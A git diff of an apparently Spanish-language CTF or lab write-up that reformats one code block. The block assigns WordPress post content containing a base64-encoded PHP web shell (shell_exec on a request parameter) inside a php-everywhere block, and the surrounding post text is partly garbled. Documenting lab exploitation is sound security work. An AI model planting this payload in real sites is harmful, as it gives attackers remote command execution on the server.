@@ -307,7 +307,9 @@ cat data
 
 ### Modificacion de la variable
 
-```malicious_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left unt one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, sevre from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywh {"code":"PD9waHAKICAgIGVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkuICI8L3ByZT4iOyAKPz4K","version":"3.0.0"} /-->\n\n<!-- wp:pa<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
+```
+malicious_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left unt one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, sevre from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywh {"code":"PD9waHAKICAgIGVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkuICI8L3ByZT4iOyAKPz4K","version":"3.0.0"} /-->\n\n<!-- wp:pa<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
+
 ```
 
 ### modificacion del post
